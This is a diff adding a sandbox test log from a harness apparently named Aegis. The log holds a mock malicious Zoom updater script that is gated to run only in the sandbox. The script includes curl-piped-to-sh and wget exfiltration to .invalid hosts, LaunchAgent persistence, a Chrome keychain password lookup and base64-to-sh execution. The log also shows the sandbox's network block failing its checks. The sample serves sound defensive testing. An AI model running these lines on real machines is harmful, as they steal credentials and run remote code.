@@ -1,0 +1,59 @@
+.env.local not found. Continuing without it.
+
+Created logs/2026-10-17-1226-sandbox-run/sample/zoom-update.sh (1595 bytes, not executable, never run here):
+
+  1  #!/bin/sh
+  2  # AEGIS TEST SAMPLE: harmless. Written by scripts/try-sandbox.mts to exercise the sandbox.
+  3  # It only looks like a malicious installer. Without AEGIS_SANDBOX=1 it does nothing.
+  4  [ "$AEGIS_SANDBOX" = "1" ] || { echo "Aegis test sample: runs only inside the Aegis sandbox."; exit 0; }
+  5  
+  6  echo "Installing Zoom update 6.4.1..."
+  7  
+  8  # 1. Download a second stage and run it. The .invalid host never resolves, and the sandbox has no
+  9  #    network, so nothing is downloaded and sh runs nothing.
+ 10  curl -fsSL https://updates.zoom-support.invalid/stage2.sh | sh
+ 11  
+ 12  # 2. Persistence: a LaunchAgent that would start at login. $HOME is a scratch folder here.
+ 13  mkdir -p "$HOME/Library/LaunchAgents"
+ 14  cat > "$HOME/Library/LaunchAgents/us.zoom.updater.plist" <<'PLIST'
+ 15  <?xml version="1.0" encoding="UTF-8"?>
+ 16  <plist version="1.0"><dict>
+ 17    <key>Label</key><string>us.zoom.updater</string>
+ 18    <key>ProgramArguments</key><array><string>/bin/echo</string><string>aegis-test</string></array>
+ 19    <key>RunAtLoad</key><true/>
+ 20  </dict></plist>
+ 21  PLIST
+ 22  
+ 23  # 3. Look for Chrome's saved passwords and ask the keychain for Chrome's key. Neither exists here.
+ 24  ls "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" 2>/dev/null
+ 25  security find-generic-password -w -s "Chrome Safe Storage" 2>/dev/null
+ 26  
+ 27  # 4. Decode base64 and run it. It decodes to: echo aegis-test-stage
+ 28  echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl | base64 -d | sh
+ 29  
+ 30  # 5. Send what it found home. Blocked: no network, and the host never resolves.
+ 31  wget -q -O /dev/null --post-data "host=$(hostname)" https://collect.zoom-support.invalid/upload
+ 32  
+ 33  echo "Update complete."
+ 34  
+
+Sandbox:
+  created fa98026f-e0c9-44d5-83ee-7e5d99f39285 with the network off
+  uploaded zoom-update.sh; SHA-256 checked inside the sandbox (2e12d9ebf84f80d60d640a921068f21a4c864b437ad5eb25ed31781697b24852)
+  2026-10-17T16:26:10.023Z  ok   create                                 2461 ms  fa98026f-e0c9-44d5-83ee-7e5d99f39285 from the default snapshot, 1 attempt, networkBlockAll=true
+  2026-10-17T16:26:12.484Z  ok   upload                                  375 ms  sample/file + sample/meta.json
+  2026-10-17T16:26:12.860Z  ok   check upload                             60 ms  exit 0
+  2026-10-17T16:26:12.921Z  ok   network probe https://example.com     21168 ms  exit 0
+  2026-10-17T16:26:34.089Z  FAIL network probe https://registry.npmjs.org/  30089 ms  command execution timeout
+  2026-10-17T16:27:04.179Z  ok   delete                                  144 ms  fa98026f-e0c9-44d5-83ee-7e5d99f39285
+
+Checks:
+FAIL sandbox job: command execution timeout
+FAIL network was off before the sample ran
+FAIL sample ran to the end inside the time limit
+FAIL sample ran in sandbox mode (AEGIS_SANDBOX=1)
+FAIL the LaunchAgent write was recorded
+FAIL the download attempts were recorded
+ok   sandbox deleted
+
+Evidence: logs/2026-10-17-1226-sandbox-run/run.json
